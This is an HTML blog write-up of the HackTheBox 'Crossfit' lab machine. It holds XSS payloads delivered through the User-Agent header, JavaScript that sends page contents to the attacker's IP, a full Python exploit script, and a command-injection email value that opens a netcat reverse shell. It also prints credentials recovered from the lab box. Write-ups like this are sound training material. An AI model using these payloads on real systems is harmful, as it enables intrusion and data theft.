@@ -1,0 +1,1405 @@
+<html>
+	<head>
+		<title>GhostCcamm's Cyber Misadventures</title>
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+		<link rel="stylesheet" href="/assets/css/main.css" />
+		<noscript><link rel="stylesheet" href="/assets/css/noscript.css" /></noscript>
+	</head>
+	<body class="is-preload">
+
+		<!-- Page Wrapper -->
+			<div id="page-wrapper">
+
+			<!-- Header -->
+				<header id="header" class="alt">
+					<h1><a href="index.html">GhostCcamm's Cyber Misadventures</a></h1>
+					<nav>
+						<a href="#menu">Menu</a>
+					</nav>
+				</header>
+
+			<!-- Menu -->
+				<nav id="menu">
+					<div class="inner">
+						<h2>Menu</h2>
+						<ul class="links">
+							<li><a href="/">Home</a></li>
+							<li><a href="/blog">Blog</a></li>
+							<li><a href="/writeups">Write Ups</a></li>
+						</ul>
+						<a href="#" class="close">Close</a>
+					</div>
+				</nav>
+
+			<!-- Banner -->
+		    <section id="banner">
+		      <div class="inner">
+		        <div class="logo"><div class="image"><img src="/images/logo.png" alt="" width="75" height="75" /></div></div>
+		        <h2>Crossfit</h2>
+						<p class="date">2021-01-09</p>
+		        <p>How to lose 10 kg completing a HackTheBox machine!</p>
+		      </div>
+		    </section>
+
+      <section id="wrapper">
+<section class="wrapper spotlight style1 ">
+<div class="inner">
+<div class="main_image"><img src=/images/writeups/htb_machines/crossfit/crossfit.png alt="" /></div>
+<div class="content">
+<h2 class="major">
+ Overview
+</h2>
+<p>
+ <strong>
+  HOLY MACKEREL THIS BOX WAS DIFFICULT!
+ </strong>
+</p>
+<p>
+ <em>
+  I lost 10 kg due to the not eating anything for a week to just get this box complete!
+ </em>
+</p>
+<p>
+ Okay I lied about losing weight,
+ <em>
+  I am still fat...
+ </em>
+</p>
+<p>
+ Anyway, this box is one of the most rewarding boxes that is currently active on HackTheBox (as of writing this). Pulling off the XSS attack and other exploits
+ <em>
+  across
+ </em>
+ <s>
+  (hah get it)
+ </s>
+ services was incredibly satisfying to complete and is definitely the biggest highlight of this box.
+</p>
+<p>
+ However, this box is a
+ <em>
+  loooooooooooooooooooong
+ </em>
+ one so I hope you have some free time to read this writeup!
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style4 alt">
+<div class="inner">
+<div class="content">
+
+<h2 class="major">
+ Initial: Finding The Gym Club Website
+</h2>
+<p>
+ Like always I started off with an Nmap scan to see what services are exposed on the box.
+</p>
+<pre class="codehilite"><code>Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-26 08:43 AWST
+Nmap scan report for crossfit.htb (10.10.10.208)
+Host is up (0.063s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 2.0.8 or later
+| ssl-cert: Subject: commonName=*.crossfit.htb/organizationName=Cross Fit Ltd./stateOrProvinceName=NY/countryName=US
+| Not valid before: 2020-04-30T19:16:46
+|_Not valid after:  3991-08-16T19:16:46
+|_ssl-date: TLS randomness does not represent time
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey:
+|   2048 b0:e7:5f:5f:7e:5a:4f:e8:e4:cf:f1:98:01:cb:3f:52 (RSA)
+|   256 67:88:2d:20:a5:c1:a7:71:50:2b:c8:07:a4:b2:60:e5 (ECDSA)
+|_  256 62:ce:a3:15:93:c8:8c:b6:8e:23:1d:66:52:f4:4f:ef (ED25519)
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Apache2 Debian Default Page: It works
+Service Info: Host: Cross; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 18.02 seconds
+</code></pre>
+<p>
+ Firstly that FTP server looked really really juicy, especially if I can get guest access to it. Unfortunately I could not...
+</p>
+<pre class="codehilite"><code>ghostccamm@kali:~/Desktop/hackthebox/machines/crossfit$ ftp crossfit.htb
+Connected to crossfit.htb.
+220 Cross Fit Ltd. FTP Server
+Name (crossfit.htb:ghostccamm): anonymous
+331 Please specify the password.
+Password:
+530 Login incorrect.
+Login failed.
+ftp&gt;
+</code></pre>
+<p>
+ Welp... That didn't work, so I tried to the website instead.
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/htb_machines/crossfit/emptywebpage.png"/>
+</p>
+<p>
+ Hmmm, I only got the default Apache page. This meant that I needed to enumerate for subdomains on the box, since at the time I could not think of an alternative attack vector based on the open services that I had found. Going back to the FTP server, I noticed that it had an SSL certificate for encryption that could provide further details about subdomains used on the box. However, Nmap did not show the full certificate so I used
+ <code>
+  openssl
+ </code>
+ to dump the full certificate. I found out later on that
+ <code>
+  nmap -vv -sC -sV -p 21 crossfit.htb
+ </code>
+ could of also dumped the necessary information from the certificate that is shown below.
+</p>
+<pre class="codehilite"><code>ghostccamm@kali:~/Desktop/hackthebox/machines/crossfit$ openssl s_client -connect crossfit.htb:21 -starttls ftp
+CONNECTED(00000003)
+depth=0 C = US, ST = NY, O = Cross Fit Ltd., CN = *.crossfit.htb, emailAddress = info@gym-club.crossfit.htb
+verify error:num=18:self signed certificate
+verify return:1
+depth=0 C = US, ST = NY, O = Cross Fit Ltd., CN = *.crossfit.htb, emailAddress = info@gym-club.crossfit.htb
+verify return:1
+---
+Certificate chain
+ 0 s:C = US, ST = NY, O = Cross Fit Ltd., CN = *.crossfit.htb, emailAddress = info@gym-club.crossfit.htb
+   i:C = US, ST = NY, O = Cross Fit Ltd., CN = *.crossfit.htb, emailAddress = info@gym-club.crossfit.htb
+---
+
+...
+</code></pre>
+<p>
+ <em>
+  Oooooo
+ </em>
+ that email indicated to me that
+ <code>
+  gym-club.crossfit.htb
+ </code>
+ would be a valid subdomain on the box. So I added it to
+ <code>
+  /etc/hosts
+ </code>
+ and checked it out.
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/htb_machines/crossfit/gymclub.png"/>
+</p>
+<p>
+ Noice I had found the Crossfit website!
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style6 ">
+<div class="inner">
+<div class="content">
+
+<h2 class="major">
+ Initial: Cross Site Scripting to Create FTP Accounts
+</h2>
+<p>
+ Now this step was pretty insane, but cool!
+</p>
+<p>
+ I spent over an hour enumerating
+ <code>
+  gym-club.crossfit.htb
+ </code>
+ trying to find any vulnerabilities. I had a fairly good idea that an XSS attack was the most likely attack method because... well the word
+ <em>
+  cross
+ </em>
+ is in the name of the box. Unfortunately, the developers of this website had implemented some XSS security checks on uploaded comments on the page http://gym-club.crossfit.htb/blog_single.php.
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/htb_machines/crossfit/xssblocked.png"/>
+</p>
+<p>
+ I found that the above security report notification was triggered whenever I tried to submit
+ <code>
+  &lt;script&gt;
+ </code>
+ in one of the comment fields.
+</p>
+<p>
+ <em>
+  Now the trick here is to stare at this message for 2 hours and drive yourself to insanity like what I did.
+ </em>
+</p>
+<p>
+ If you want to avoid the mental exhaustion, open up Burp Suite and look at what is being sent in your POST requests when you make a comment. Notice that your browser details is in the
+ <code>
+  User-Agent
+ </code>
+ request header and the security report that is generated will contain your
+ <em>
+  'browser information'
+ </em>
+ ?
+</p>
+<p>
+ <strong>
+  What if the developers of the site assumed that the browser information from
+  <code>
+   User-Agent
+  </code>
+  is secure and did not sanitise the input?
+ </strong>
+</p>
+<p>
+ I tested this by using Burp Suite to modify the
+ <code>
+  User-Agent
+ </code>
+ request header to
+ <code>
+  &lt;script src=http://&lt;my ip address here&gt;/test.js&gt;&lt;/script&gt;
+ </code>
+ and to see if I get a response from the server on my
+ <code>
+  netcat
+ </code>
+ listener.
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/htb_machines/crossfit/wegotxss.png"/>
+</p>
+<p>
+ So wow, it worked! That is a pretty nifty method for XSS! A little bit guessy, but can definitely happen in real life.
+</p>
+<p>
+ I also found a new page that I could check http://gym-club.crossfit.htb/security_threat/report.php. However, we cannot directly access the page that makes me think that this page can only be accessed by
+ <code>
+  localhost
+ </code>
+ , since there are no session cookies in the request.
+</p>
+<p>
+ I exfiltrated the HTML of webpages by using either the XMLHttpRequest or fetch API, then base64 encoding the response as a GET parameter back to my own server. In the example below I am just using the fetch API but used XMLHttpRequest later on.
+</p>
+<p>
+ <em>
+  exfiltrate.js
+ </em>
+</p>
+<pre class="codehilite"><code>fetch("http://gym-club.crossfit.htb/security_threat/report.php")
+.then(function(data) {
+    data.text().then(function(r_txt) {
+        fetch("http://10.10.14.33:80/get_result.html?p="+btoa(r_txt));
+    });
+});
+</code></pre>
+<p>
+ <img alt="" class="center" src="/images/writeups/htb_machines/crossfit/exfiltratinghtml.png"/>
+</p>
+<p>
+ The HTML content from the security report webpage did not give me any useful information. However, I learnt that I could access locally running web servers that the developers never intended to be externally exposed.
+</p>
+<p>
+ I started marking some educated guesses for subdomains on the machine. One of the most obvious subdomains that I guessed was
+ <code>
+  ftp.crossfit.htb
+ </code>
+ , because of the FTP server that on the box. When I connected to
+ <code>
+  ftp.crossfit.htb
+ </code>
+ I was immediately redirected to http://ftp.crossfit.htb/accounts, that showed that I could create an account for the FTP server at http://ftp.crossfit.htb/accounts/create...
+</p>
+<p>
+ <em>
+  Noooooiiiiice
+ </em>
+</p>
+<p>
+ Let's take a closer look at the POST request form on the FTP account creation page.
+</p>
+<pre class="codehilite"><code>&lt;form action="http://ftp.crossfit.htb/accounts" method="POST"&gt;
+    &lt;input type="hidden" name="_token" value="KrZi8JGDZH7PMxhTEcVyFlc0WuKTHw82PX15ObxR"&gt;
+     &lt;div class="row"&gt;
+        &lt;div class="col-xs-12 col-sm-12 col-md-12"&gt;
+            &lt;div class="form-group"&gt;
+                &lt;strong&gt;Username:&lt;/strong&gt;
+                &lt;input type="text" name="username" class="form-control" placeholder="Username"&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+        &lt;div class="col-xs-12 col-sm-12 col-md-12"&gt;
+            &lt;div class="form-group"&gt;
+                &lt;strong&gt;Password:&lt;/strong&gt;
+                &lt;input type="password" name="pass" class="form-control" placeholder="Password"&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+        &lt;div class="col-xs-12 col-sm-12 col-md-12 text-center"&gt;
+                &lt;button type="submit" class="btn btn-primary"&gt;Submit&lt;/button&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+&lt;/form&gt;
+</code></pre>
+<p>
+ So I just need to submit a POST request to http://ftp.crossfit.htb/accounts with the generated token and my username and password? Seems pretty easy...
+ <em>
+  right??
+ </em>
+</p>
+<p>
+ <strong>
+  NOPE!
+ </strong>
+</p>
+<p>
+ Like always for me, I had to waste several hours on the most mundane problems. This time, the tokens that were generated and required for FTP account creation kept on expiring for me. I fiddled around with my JavaScript payload for ages, chucked out using the
+ <code>
+  fetch
+ </code>
+ API and tried to write the XSS exploit with
+ <s>
+  completely horrible
+ </s>
+ XMLHttpRequests.
+</p>
+<p>
+ In the end, my only issue was because I was not setting the
+ <code>
+  withCredentials
+ </code>
+ property for the XMLHttpRequests to true... The property allows for cross-site
+ <code>
+  Access-Control
+ </code>
+ requests, which I obviously needed since I was completing a XSS attack. I believe that was the correct explanation as to why I needed
+ <code>
+  Access-Control
+ </code>
+ , I honestly got so frustrated I went through the documentation and just tried everything until it worked. Definitely not the best methodology for this sort of thing...
+</p>
+<p>
+ Oh well... At least I had a working XXS payload that created an account on the FTP server, which I have shown below. My payload is actually embedded within a Python program that I wrote, but I will show that in a later section about initial foothold since it contains another payload not yet discussed.
+</p>
+<p>
+ <em>
+  payload.js
+ </em>
+</p>
+<pre class="codehilite"><code>x = new XMLHttpRequest;
+x.onreadystatechange = function() {
+    if(x.readyState == 4) {
+        r_txt = this.responseText;
+
+        // Gets the nonce from the account creation page.
+        re = new RegExp('&lt;input type="hidden" name="_token" value="(.*?)"&gt;')
+        token = r_txt.match(re)[1];
+
+        post_data = "_token=" + token + "&amp;username=test&amp;pass=test12345678"
+
+        y = new XMLHttpRequest;
+        y.open("POST", "http://ftp.crossfit.htb/accounts");
+        y.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+        y.withCredentials = true;
+        y.onreadystatechange = function() {
+            if(y.readyState == 4) {
+                z = new XMLHttpRequest;
+                z.open("GET", "http://10.10.14.52:80/get_result.html?p="+btoa(r_txt + post_data + this.responseText));
+                z.send()
+            }
+        };
+        y.send(post_data);
+    }
+}
+x.open("GET", "http://ftp.crossfit.htb/accounts/create");
+x.withCredentials = true;
+x.send();
+</code></pre>
+</div>
+</div>
+</section>
+<section class="wrapper style5 alt">
+<div class="inner">
+<div class="content">
+
+<h2 class="major">
+ Initial: Getting In By Uploading Naughty PHP Files To The FTP Server
+</h2>
+<p>
+ After I created my FTP account, I couldn't get
+ <code>
+  ftp
+ </code>
+ of
+ <code>
+  sftp
+ </code>
+ to work for some reason, but I was too lazy to find a good CLI solution and just used FileZilla instead.
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/htb_machines/crossfit/ftpfilezilla.png"/>
+</p>
+<p>
+ I could now see the source code for the different web servers that were running on the machine. There was also an empty folder called
+ <code>
+  development-test
+ </code>
+ that I could upload files to, which is
+ <em>
+  very very very very
+ </em>
+ interesting.
+</p>
+<p>
+ If the
+ <code>
+  development-test
+ </code>
+ folder was used to stage source code before production and was live, then I could upload some malicious code into that folder and gain access that way. I quickly found that when my files were uploaded I could access them using the previously mentioned XSS exploit to fetch my content on the subdomain
+ <code>
+  development-test.crossfit.htb
+ </code>
+ . Guessing that PHP was used on the development server, I first uploaded a PHP reverse shell file and...
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/htb_machines/crossfit/wearein.png"/>
+</p>
+<p>
+ <strong>
+  WE ARE IN BAAAAAAAAAAAAAAAABBBBBBBY!!!
+ </strong>
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style3 ">
+<div class="inner">
+<div class="content">
+
+<h2 class="major">
+ Initial: Using Python To Handle the HTTP Requests to Perform the XSS Attacks
+</h2>
+<p>
+ To help me carry out my XSS exploits, I created a Python script that handles the HTTP requests, JavaScript payloads and the decoding of the exfiltrated data automatically. It should work without any issues for you, with the exception that you need to name your uploaded PHP reverse shell as
+ <code>
+  rs.php
+ </code>
+ (you can change this within the source code of course).
+</p>
+<details>
+ <summary>
+  <b>
+   Python Exploit Code
+  </b>
+ </summary>
+ <pre class="codehilite"><code class="language-python">import requests, threading, queue, argparse, base64, time, logging, re, sys
+from http.server import BaseHTTPRequestHandler, HTTPServer
+
+class PayloadHandler(BaseHTTPRequestHandler):
+    FTP_CREATE_PAYLOAD = """
+  x = new XMLHttpRequest;
+  x.onreadystatechange = function() {{
+    if(x.readyState == 4) {{
+        r_txt = this.responseText;
+
+        // Gets the nonce from the account creation page.
+        re = new RegExp('&lt;input type="hidden" name="_token" value="(.*?)"&gt;')
+        token = r_txt.match(re)[1];
+
+        post_data = "_token=" + token + "&amp;username={username}&amp;pass={password}"
+
+        y = new XMLHttpRequest;
+        y.open("POST", "http://ftp.crossfit.htb/accounts");
+        y.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+        y.withCredentials = true;
+        y.onreadystatechange = function() {{
+            if(y.readyState == 4) {{
+                z = new XMLHttpRequest;
+                z.open("GET", "http://{lhost}:{lport}/get_result.html?p="+btoa(r_txt + post_data + this.responseText));
+                z.send()
+            }}
+        }};
+        y.send(post_data);
+    }}
+
+  }}
+  x.open("GET", "http://ftp.crossfit.htb/accounts/create");
+  x.withCredentials = true;
+  x.send();
+  """
+
+    REVERSE_SHELL_PAYLOAD = """
+  async function postData(url = '', data = '') {{
+    const response = await fetch(url, {{
+        method: "POST",
+        body: data
+    }});
+    return response
+  }}
+
+  fetch("http://development-test.crossfit.htb/rs.php")
+  .then(function(data) {{
+    data.text().then(function(r_txt) {{
+        fetch("http://{lhost}:{lport}/get_result.html?p="+btoa(r_txt));
+    }});
+  }});
+  """
+
+    lhost = ""
+    lport = ""
+    payload = ""
+    payload_queue = queue.Queue()
+
+    def _set_response(self):
+        self.send_response(200)
+        self.send_header('Content-type', 'text/html')
+        self.end_headers()
+
+    def do_GET(self):
+        if "/get_result.html" in self.path:
+            encoded_data = self.path[19:]
+            decoded_data = base64.b64decode(encoded_data).decode("utf-8")
+            print(decoded_data)
+            sys.exit(0)
+
+        if self.path == "/payload.js":
+            self._set_response()
+            self.wfile.write(PayloadHandler.payload.encode("utf-8"))
+            return
+
+        self._set_response()
+        self.wfile.write("Hi there!\n".encode("utf-8"))
+
+
+    def send_request(payload_file):
+        headers = {
+            "User-Agent" : "&lt;script src=http://{lhost}:{lport}/{payload} &gt;&lt;/script&gt;".format(
+                lhost=PayloadHandler.lhost,
+                lport=PayloadHandler.lport,
+                payload=payload_file
+            )
+        }
+
+        data = {
+            "name" : "fakename",
+            "email" : "fake@email.com",
+            "phone" : "420696969",
+            "message" : "&lt;script&gt;", # Needed to trigger the security report
+            "submit" : "submit"
+        }
+
+        print("Sending Payload to: {}".format(payload_file))
+        r = requests.post("http://gym-club.crossfit.htb/blog-single.php",
+                            headers=headers,
+                            data=data)
+
+    def _worker():
+        while True:
+            payload_file = PayloadHandler.payload_queue.get()
+
+            if payload_file == None:
+                break
+
+            if payload_file == "wait":
+                print("Starting Exploit in 2 seconds!")
+                time.sleep(2)
+                PayloadHandler.payload_queue.task_done()
+                continue
+            PayloadHandler.send_request(payload_file)
+            PayloadHandler.payload_queue.task_done()
+
+
+    def set_payloads(username, password, lhost, lport, trigger_rs):
+        PayloadHandler.lhost = lhost
+        PayloadHandler.lport = lport
+
+        if trigger_rs:
+            PayloadHandler.payload = PayloadHandler.REVERSE_SHELL_PAYLOAD
+        else:
+            PayloadHandler.payload = PayloadHandler.FTP_CREATE_PAYLOAD
+
+        PayloadHandler.payload = PayloadHandler.payload.format(
+            lhost=lhost,
+            lport=lport,
+            username=username,
+            password=password
+        )
+
+        print(PayloadHandler.payload)
+
+    def run():
+        worker_thread = threading.Thread(target=PayloadHandler._worker, daemon=True)
+        worker_thread.start()
+        logging.basicConfig(level=logging.WARNING)
+        httpd = HTTPServer((PayloadHandler.lhost, PayloadHandler.lport), PayloadHandler)
+        PayloadHandler.payload_queue.put(("wait"))
+        PayloadHandler.payload_queue.put(("payload.js"))
+        try:
+            httpd.serve_forever()
+        except KeyboardInterrupt:
+            pass
+
+        worker_thread.join()
+        httpd.server_close()
+
+def parse_args():
+    parser = argparse.ArgumentParser(description="Exploitation script for Crossfit to create FTP accounts")
+
+    parser.add_argument('-u', '--username',
+                        help='the name of the FTP user to create',
+                        required=True)
+
+    parser.add_argument('-p', '--password',
+                        help='the password to set for the FTP account',
+                        required=True)
+
+    parser.add_argument('-H', '--lhost',
+                        help='your IP address for hosting the web server',
+                        required=True)
+
+    parser.add_argument('-P', '--lport',
+                        help='the port to use for the web server',
+                        required=True,
+                        type=int)
+
+    parser.add_argument('-R', '--trigger_rs',
+                        help="Should trigger the uploaded reverse shell instead of creating a FTP account",
+                        action="store_true")
+
+    return parser.parse_args()
+
+def exploit(username, password, lhost, lport, trigger_rs):
+    PayloadHandler.set_payloads(username, password, lhost, lport, trigger_rs)
+    PayloadHandler.run()
+
+if __name__ == "__main__":
+    args = parse_args()
+    exploit(args.username, args.password, args.lhost, args.lport, args.trigger_rs)
+</code></pre>
+</details>
+</div>
+</div>
+</section>
+<section class="wrapper style2 alt">
+<div class="inner">
+<div class="content">
+
+<h2 class="major">
+ User 1: How To Run LinPEAS
+</h2>
+<p>
+ A fairly standard task to do when you have access to a machine is to run privilege escalation tools on the box. I used the lovely
+ <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite">
+  linPEAS
+ </a>
+ to see if it could automatically find anything juicy for me, which it found a stored hash for the user
+ <code>
+  hank
+ </code>
+ in
+ <code>
+  /etc/ansible/playbooks/adduser_hank.yml
+ </code>
+ .
+</p>
+<pre class="codehilite"><code>[+] Looking for specific hashes inside files - less false positives (limit 70)
+/etc/ansible/playbooks/adduser_hank.yml:$6$e20D6nUeTJOIyRio$A777Jj8tk5.sfACzLuIqqfZOCsKTVCfNEQIbH79nZf09mM.Iov/pzDCE8xNZZCM9MuHKMcjqNUd8QUEzC1CZG/
+</code></pre>
+<p>
+ This hash could be cracked using the RockYou wordlist and is 'powerpuffgirls'. So I tried logging in as
+ <code>
+  hank
+ </code>
+ on the box and
+ <strong>
+  BINGO!
+ </strong>
+ I had access to
+ <code>
+  hank
+ </code>
+ on the box and the got the user flag!
+</p>
+<pre class="codehilite"><code>$ python3 -c "import pty; pty.spawn('/bin/bash')"
+www-data@crossfit:/$ su hank
+su hank
+Password: powerpuffgirls
+
+hank@crossfit:/$ cd
+cd
+hank@crossfit:~$ cat user.txt
+cat user.txt
+cf710dc09c2e30d3609fedfd8f7c0d37
+</code></pre>
+<p>
+ <em>
+  Easily the hardest part of this machine.
+ </em>
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style1 ">
+<div class="inner">
+<div class="content">
+
+<h2 class="major">
+ User 2: Escalating Privileges Using The FTP, MySQL and PHP Servers
+</h2>
+<p>
+ Besides
+ <code>
+  hank
+ </code>
+ , there was another user called
+ <code>
+  isaac
+ </code>
+ on the box that had exposed some interesting source code for some PHP file called
+ <code>
+  send_updates.php
+ </code>
+ .
+</p>
+<pre class="codehilite"><code>hank@crossfit:~$ cat /home/isaac/send_updates/send_updates.php
+&lt;?php
+/***************************************************
+ * Send email updates to users in the mailing list *
+ ***************************************************/
+require("vendor/autoload.php");
+require("includes/functions.php");
+require("includes/db.php");
+require("includes/config.php");
+use mikehaertl\shellcommand\Command;
+
+if($conn)
+{
+    $fs_iterator = new FilesystemIterator($msg_dir);
+
+    foreach ($fs_iterator as $file_info)
+    {
+        if($file_info-&gt;isFile())
+        {
+            $full_path = $file_info-&gt;getPathname();
+            $res = $conn-&gt;query('SELECT email FROM users');
+            while($row = $res-&gt;fetch_array(MYSQLI_ASSOC))
+            {
+                $command = new Command('/usr/bin/mail');
+                $command-&gt;addArg('-s', 'CrossFit Club Newsletter', $escape=true);
+                $command-&gt;addArg($row['email'], $escape=true);
+
+                $msg = file_get_contents($full_path);
+                $command-&gt;setStdIn('test');
+                $command-&gt;execute();
+            }
+        }
+        unlink($full_path);
+    }
+}
+
+cleanup();
+?&gt;
+</code></pre>
+<p>
+ The above PHP code emails files that are uploaded to some message folder to all emails that are stored within a database using
+ <a href="https://github.com/mikehaertl/php-shellcommand">
+  mikehaertl's php-shellcommand
+ </a>
+ . Unfortunately I could not view what was stored inside of the
+ <code>
+  config.php
+ </code>
+ and
+ <code>
+  db.php
+ </code>
+ files, but I can see that php-shellcommand version 1.6.0 was used by looking at the
+ <code>
+  composer.json
+ </code>
+ file.
+</p>
+<pre class="codehilite"><code>hank@crossfit:/home/isaac/send_updates$ cat composer.json
+{
+    "require": {
+        "mikehaertl/php-shellcommand": "1.6.0"
+    }
+}
+</code></pre>
+<p>
+ After some quick googling that I did to learn what the heck this php-shellcommand was, I found out that versions before 1.6.1 were
+ <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10774">
+  <strong>
+   vulnerable to command injection!
+  </strong>
+ </a>
+ The jist of the vulnerability is that if an invalid argument is given to
+ <code>
+  addArg
+ </code>
+ and results in an error code, we can then append additional commands to the argument so that they are executed.
+</p>
+<p>
+ Using the above source code, if we give it an
+ <em>
+  'email'
+ </em>
+ of
+ <code>
+  -B || nc 10.10.14.52 1234 -e /bin/bash
+ </code>
+ , the
+ <code>
+  -B
+ </code>
+ option will trigger the error code for
+ <code>
+  mail
+ </code>
+ since it is an invalid option and our payload (in this case a netcat reverse shell) would be executed.
+</p>
+<p>
+ <em>
+  Noice
+ </em>
+</p>
+<p>
+ I had a method to run arbitrary commands, but was it useful to escalate our privileges?
+ <em>
+  Yes
+ </em>
+ , I early on I looked at the running cronjobs and found that
+ <code>
+  send_updates.php
+ </code>
+ was executed every minute using the user
+ <code>
+  isaac
+ </code>
+ .
+</p>
+<pre class="codehilite"><code>hank@crossfit:/home/isaac/send_updates$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+MAILTO=""
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
+*  *    * * *   isaac   /usr/bin/php /home/isaac/send_updates/send_updates.php
+#
+</code></pre>
+<p>
+ <em>
+  Nooice
+ </em>
+</p>
+<p>
+ However, now I needed to figure out the credentials for the MySQL server and where this mysterious
+ <code>
+  $msg_dir
+ </code>
+ was located.
+</p>
+<p>
+ Firstly I looked for access to the MySQL server. I remembered from when I was enumerating http://gym-club.crossfit.htb/ that I found a page to sign up to their newsletter. That page indicated to me that the emails are stored in some database. So I took a closer look at the source code for the Gym Club website and found the MySQL credentials I needed.
+</p>
+<pre class="codehilite"><code>hank@crossfit:/var/www/gym-club$ cat db.php
+&lt;?php
+$dbhost = "localhost";
+$dbuser = "crossfit";
+$dbpass = "oeLoo~y2baeni";
+$db = "crossfit";
+$conn = new mysqli($dbhost, $dbuser, $dbpass, $db);
+?&gt;
+</code></pre>
+<p>
+ <em>
+  Noooice
+ </em>
+</p>
+<p>
+ All I had to do now was find the location of where the message files were placed in order to trigger the exploit. I was stuck at this point for sometime searching for this folder, since no name was given. How I found it in the end was by checking files that are owned by the group
+ <code>
+  admins
+ </code>
+ , which hank was a member of.
+</p>
+<pre class="codehilite"><code>hank@crossfit:/var/www/gym-club$ find / -group admins -type f 2&gt;/dev/null
+/home/isaac/send_updates/composer.lock
+/home/isaac/send_updates/send_updates.php
+/home/isaac/send_updates/composer.json
+/etc/pam.d/chfn
+/etc/pam.d/newusers
+/etc/pam.d/vmtoolsd
+/etc/pam.d/common-auth
+/etc/pam.d/login
+/etc/pam.d/systemd-user
+/etc/pam.d/runuser-l
+/etc/pam.d/common-account
+/etc/pam.d/vsftpd.orig
+/etc/pam.d/su
+/etc/pam.d/vsftpd
+/etc/pam.d/su-l
+/etc/pam.d/chpasswd
+/etc/pam.d/common-password
+/etc/pam.d/common-session-noninteractive
+/etc/pam.d/sshd
+/etc/pam.d/common-session
+/etc/pam.d/other
+/etc/pam.d/chsh
+/etc/pam.d/passwd
+/etc/pam.d/cron
+/etc/pam.d/runuser
+</code></pre>
+<p>
+ Very interesting since
+ <code>
+  /etc/pam.d
+ </code>
+ is used for storing the configuration files for Pluggable Authentication Modules (PAM). Taking a look at the contents of the
+ <code>
+  vsftpd
+ </code>
+ configuration I found some new FTP credentials.
+</p>
+<pre class="codehilite"><code>hank@crossfit:/etc/pam.d$ cat vsftpd
+auth sufficient pam_mysql.so user=ftpadm passwd=8W)}gpRJvAmnb host=localhost db=ftphosting table=accounts usercolumn=username passwdcolumn=pass crypt=3
+account sufficient pam_mysql.so user=ftpadm passwd=8W)}gpRJvAmnb host=localhost db=ftphosting table=accounts usercolumn=username passwdcolumn=pass crypt=3
+
+# Standard behaviour for ftpd(8).
+auth    required        pam_listfile.so item=user sense=deny file=/etc/ftpusers onerr=succeed
+
+# Note: vsftpd handles anonymous logins on its own. Do not enable pam_ftp.so.
+
+# Standard pam includes
+@include common-account
+@include common-session
+@include common-auth
+auth    required        pam_shells.so
+</code></pre>
+<p>
+ Logging into the FTP server with
+ <code>
+  ftpadm:8W)}gpRJvAmnb
+ </code>
+ revealed a
+ <code>
+  messages
+ </code>
+ folder that I could not see before, which I assumed was the elusive
+ <code>
+  $msg_dir
+ </code>
+ that I had been looking for since nothing else on the machine was it.
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/htb_machines/crossfit/ftpadmmessages.png"/>
+</p>
+<p>
+ <em>
+  Nooooice
+ </em>
+</p>
+<p>
+ So putting it all together, to trigger the exploit I needed to upload some file to the messages folder on the FTP server. On the MySQL database I need to insert a row in the users table with an
+ <em>
+  'email'
+ </em>
+ of something like
+ <code>
+  -B || nc 10.10.14.52 1234 -e /bin/bash
+ </code>
+ to execute my reverse shell. Finally I needed to go and get a glass of water while waiting for my exploit to run.
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/htb_machines/crossfit/iminversion2.png"/>
+</p>
+<p>
+ <em>
+  Noooooice
+ </em>
+</p>
+<p>
+ I got a
+ <s>
+  pretty crappy
+ </s>
+ shell as
+ <code>
+  isaac
+ </code>
+ . To give myself a more stable shell, I added my public SSH key as an authorized key for
+ <code>
+  isaac
+ </code>
+ so I could SSH in.
+</p>
+<pre class="codehilite"><code>ghostccamm@kali:~/Desktop/hackthebox/machines/crossfit/get_root/ssh_keys$ ssh -i id_rsa isaac@crossfit.htb
+Enter passphrase for key 'id_rsa':
+Linux crossfit 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64
+
